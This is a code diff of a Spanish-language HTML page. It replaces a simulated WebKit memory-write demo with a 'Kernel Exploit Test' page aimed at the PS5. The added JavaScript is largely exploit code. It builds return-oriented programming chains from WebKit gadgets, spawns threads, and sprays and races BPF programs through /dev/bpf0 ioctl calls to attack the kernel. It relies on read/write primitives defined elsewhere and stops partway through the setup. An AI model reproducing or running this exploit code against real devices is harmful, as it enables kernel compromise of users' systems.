@@ -3,116 +3,210 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Prueba de Concepto: Explotación de WebKit</title>
+    <title>Kernel Exploit Test</title>
     <style>
         body {
             font-family: Arial, sans-serif;
-            background-color: #1c1c1c;
-            color: white;
-            text-align: center;
-            padding-top: 50px;
-        }
-        .console {
             background-color: #333;
-            color: #0f0;
-            padding: 10px;
+            color: white;
+            margin: 0;
+            padding: 20px;
+        }
+        pre {
+            background-color: #222;
+            padding: 15px;
             border-radius: 5px;
-            width: 80%;
-            margin: 20px auto;
-            font-size: 14px;
-            max-height: 300px;
-            overflow-y: auto;
-            white-space: pre-wrap;
-            word-wrap: break-word;
+            max-width: 100%;
+            overflow-x: auto;
+        }
+        h1 {
+            color: #4CAF50;
         }
     </style>
 </head>
 <body>
 
-<h1>Exploit WebKit - PS5 (Firmware 5.50)</h1>
-<p>Este es un PoC para probar la manipulación de memoria en WebKit usando primitivas RW.</p>
-
-<div class="console" id="consoleOutput">Esperando resultado...</div>
-
-<script>
-// Inicialización de las direcciones y valores
-const voff_data = 0x1000;  // Ejemplo de desplazamiento
-const voff_vec_abc = 0x2000; // Dirección del Vector de ArrayBuffer
-const voff_abc = 0x3000;  // Dirección del ArrayBuffer
-const addr = 0x5000;  // Dirección de datos
-const size = 0x20;  // Tamaño del ArrayBuffer
-
-// Crear un ArrayBuffer y DataView para manipulación
-const view = new DataView(new ArrayBuffer(0x10000));  // Simulando un ArrayBuffer
-
-// Función para escribir valores en la memoria simulada
-function write32(offset, value) {
-    view.setUint32(offset, value, true);
-    consoleLog(`write32(0x${offset.toString(16)}): 0x${value.toString(16)}`);
-}
-
-// Función para escribir 64 bits en la memoria simulada
-function write64(offset, value) {
-    view.setBigUint64(offset, BigInt(value), true);
-    consoleLog(`write64(0x${offset.toString(16)}): 0x${value.toString(16)}`);
-}
-
-// Escribir la versión y la etiqueta en la memoria
-write32(voff_data, 6); // Versión
-view.setUint8(voff_data + 4, 23); // Etiqueta de transferencia
-write32(voff_data + 5, 0); // Relleno
-
-// Manipulación del ArrayBuffer
-write64(voff_vec_abc, voff_abc);
-write32(voff_vec_abc + 8, 1);  // Número de elementos en el ArrayBuffer
-write32(voff_vec_abc + 0xc, 1);  // Propiedades
-
-// Escribir los datos en el ArrayBuffer
-if (size === 0x20) {
-    write64(voff_abc + 0x10, addr);  // Dirección de los datos
-    write32(voff_abc + 0x18, size);  // Tamaño del ArrayBuffer
-} else {
-    write64(voff_abc + 0, addr);
-    write32(voff_abc + 0x14, size);
-}
-
-// Simulación de la escritura en un objeto falso (fake object)
-const fakeobj_off = 0x20;  // Desplazamiento del objeto falso
-const fakebt_base = fakeobj_off + 0x30;  // Base del objeto
-const indexingHeader_size = 8;  // Tamaño de la cabecera
-const arrayStorage_size = 0x18;  // Tamaño de almacenamiento del Array
-const fakebt_off_final = fakebt_base + indexingHeader_size + arrayStorage_size;
-
-// Escribir un objeto falso en la memoria
-write64(fakebt_off_final, 0x12345678);  // Dirección del objeto falso
-write32(fakebt_off_final + 0x4, 0x98765432);  // Valor falso a escribir
-
-// Función para escribir y leer en la memoria simulada
-function performHeapManipulation() {
-    const fake_address = 0x87654321;  // Dirección ficticia
-    const fake_value = 0xDEADBEEF;  // Valor ficticio a escribir
+    <h1>Prueba de Kernel Exploit</h1>
+    <p>Este es un ejemplo de cómo cargar y ejecutar un kernel exploit en PS5 (o entorno similar).</p>
     
-    write64(fake_address, fake_value);  // Escribir en la dirección simulada
-    const read_value = read64(fake_address);  // Leer el valor de la dirección simulada
+    <pre id="console-output"></pre>
 
-    consoleLog(`Valor leído de la dirección 0x${fake_address.toString(16)}: 0x${read_value.toString(16)}`);
-}
+    <script>
+        // Redirigir console.log() a la interfaz HTML para ver los resultados en tiempo real.
+        const consoleOutput = document.getElementById('console-output');
+        console.log = function (message) {
+            consoleOutput.textContent += message + '\n';
+        };
 
-// Función para leer desde una dirección de memoria (simulación)
-function read64(address) {
-    return 0x12345678;  // Valor ficticio leído desde la memoria
-}
+        // Aquí va el código JavaScript proporcionado anteriormente
+        console.log("--- trying kernel exploit --");
 
-// Función para agregar logs a la consola
-function consoleLog(message) {
-    const consoleOutput = document.getElementById('consoleOutput');
-    consoleOutput.textContent += message + '\n';
-    consoleOutput.scrollTop = consoleOutput.scrollHeight;  // Desplazar hacia abajo
-}
+        function malloc(sz) {
+            const backing = new Uint8Array(0x10000 + sz);
+            window.nogc.push(backing);
+            const ptr = p.read8(p.leakval(backing).add32(0x10));
+            ptr.backing = backing;
+            return ptr;
+        }
 
-// Ejecutar la manipulación de memoria
-performHeapManipulation();
-</script>
+        function malloc32(sz) {
+            const backing = new Uint8Array(0x10000 + sz * 4);
+            window.nogc.push(backing);
+            const ptr = p.read8(p.leakval(backing).add32(0x10));
+            ptr.backing = new Uint32Array(backing.buffer);
+            return ptr;
+        }
 
+        const strcpy_helper = new Uint8Array(0x1000);
+        const where_writeptr_strcpy = p.leakval(strcpy_helper).add32(0x10);
+
+        function strcpy(ptr, str) {
+            p.write8(where_writeptr_strcpy, ptr);
+            for (let i = 0; i < str.length; i++) {
+                strcpy_helper[i] = str.charCodeAt(i) & 0xFF;
+            }
+            strcpy_helper[str.length] = 0;
+        }
+
+        const spawnthread = (name, chain) => {
+            const longjmp = window.webKitBase.add32(0x14e8);
+            const createThread = window.webKitBase.add32(0x779190);
+
+            const contextp = malloc32(0x2000);
+            const contextz = contextp.backing;
+            contextz[0] = 1337;
+
+            const thread2 = new RopChain();
+            thread2.push(window.gadgets["ret"]); // nop
+            thread2.push(window.gadgets["ret"]); // nop
+            thread2.push(window.gadgets["ret"]); // nop
+            thread2.push(window.gadgets["ret"]); // nop
+            chain(thread2);
+
+            p.write8(contextp, window.gadgets["ret"]); // rip -> ret gadget
+            p.write8(contextp.add32(0x10), thread2.ropframeptr); // rsp
+
+            const retv = () => p.fcall(createThread, longjmp, contextp, p.sptr(name));
+
+            window.nogc.push(contextp);
+            window.nogc.push(thread2);
+
+            return retv;
+        }
+
+        const fd = p.syscall("open", p.sptr("/dev/bpf0"), 2).low;
+        const fd1 = p.syscall("open", p.sptr("/dev/bpf0"), 2).low;
+        if (fd === (-1 >>> 0)) {
+            console.log("kexp failed: no bpf0");
+        }
+
+        let assertcnt = 0;
+        const assert = (x) => {
+            assertcnt++;
+            if (!x) throw `assertion ${assertcnt} failed`;
+        };
+
+        console.log("got it");
+
+        const bpf_valid = malloc32(0x4000);
+        const bpf_spray = malloc32(0x4000);
+        const bpf_valid_u32 = bpf_valid.backing;
+        const bpf_valid_prog = malloc(0x40);
+        p.write8(bpf_valid_prog, 0x800 / 8);
+        p.write8(bpf_valid_prog.add32(8), bpf_valid);
+        const bpf_spray_prog = malloc(0x40);
+        p.write8(bpf_spray_prog, 0x800 / 8);
+        p.write8(bpf_spray_prog.add32(8), bpf_spray);
+
+        for (let i = 0; i < 0x400; i++) {
+            bpf_valid_u32[i++] = 6; // BPF_RET
+            bpf_valid_u32[i++] = 0;
+        }
+
+        const rtv = p.syscall("ioctl", fd, 0x8010427B, bpf_valid_prog);
+        assert(rtv.low === 0);
+
+        console.log("okay");
+
+        let interrupt1, loop1;
+        let interrupt2, loop2;
+        const sock = p.syscall(97, 2, 2);
+        const kscratch = malloc32(0x100);
+
+        const start1 = spawnthread("GottaGoFast", (thread2) => {
+            interrupt1 = thread2.ropframeptr;
+            thread2.push(window.gadgets["ret"]); // pop rdx
+            thread2.push(window.gadgets["ret"]); // pop rdx
+            thread2.push(window.gadgets["ret"]); // pop rdx
+
+            thread2.push(window.gadgets["pop rdi"]); // pop rdi
+            thread2.push(fd); // what
+            thread2.push(window.gadgets["pop rsi"]); // pop rsi
+            thread2.push(0x8010427B); // what
+            thread2.push(window.gadgets["pop rdx"]); // pop rdx
+            thread2.push(bpf_valid_prog); // what
+            thread2.push(window.gadgets["pop rsp"]); // pop rdx
+            thread2.push(thread2.ropframeptr.add32(0x800)); // what
+            thread2.count = 0x100;
+            const cntr = thread2.count;
+            thread2.push(window.syscalls[54]); // ioctl
+            thread2.push_write8(thread2.ropframeptr.add32(cntr * 8), window.syscalls[54]); // restore ioctl
+
+            thread2.push(window.gadgets["pop rdi"]); // pop rdi
+            const wherep = thread2.pushSymbolic(); // where
+            thread2.push(window.gadgets["pop rsi"]); // pop rsi
+            const whatp = thread2.pushSymbolic(); // where
+            thread2.push(window.gadgets["mov [rdi], rsi"]); // perform write
+
+            thread2.push(window.gadgets["pop rsp"]); // pop rdx
+
+            loop1 = thread2.ropframeptr.add32(thread2.count * 8);
+            thread2.push(0x41414141); // what
+
+            thread2.finalizeSymbolic(wherep, loop1);
+            thread2.finalizeSymbolic(whatp, loop1.sub32(8));
+        });
+
+        const krop = new RopChain();
+        const race = new RopChain();
+        const ctxp = malloc32(0x2000);
+        const ctxp1 = malloc32(0x2000);
+
+        p.write8(bpf_spray.add32(16), ctxp);
+
+        const prefaultlist = [];
+        const pfd = (addr) => {
+            const page = addr.add32(0);
+            page.low &= 0xffffc000;
+            p.syscall("mlock", page, 0x8000);
+            p.read4(addr);
+            return addr;
+        };
+
+        const pf = (addr) => {
+            const page = addr.add32(0);
+            page.low &= 0xffffc000;
+            p.syscall("mlock", page, 0x8000);
+            let ret = addr.add32(0);
+            while (1) {
+                const opcode = (p.read4(ret) & 0xff);
+                if (opcode === 0xc3) {
+                    prefaultlist.push(ret);
+                    break;
+                }
+                ret.add32inplace(1);
+            }
+            return addr;
+        };
+
+        for (const gadgetname in gadgets) {
+            if (gadgets.hasOwnProperty(gadgetname)) {
+                if (gadgetname === "stack_chk_fail" || gadgetname === "memset" || gadgetname === "setjmp") continue;
+                pf(gadgets[gadgetname]);
+            }
+        }
+
+    </script>
+    
 </body>
 </html>
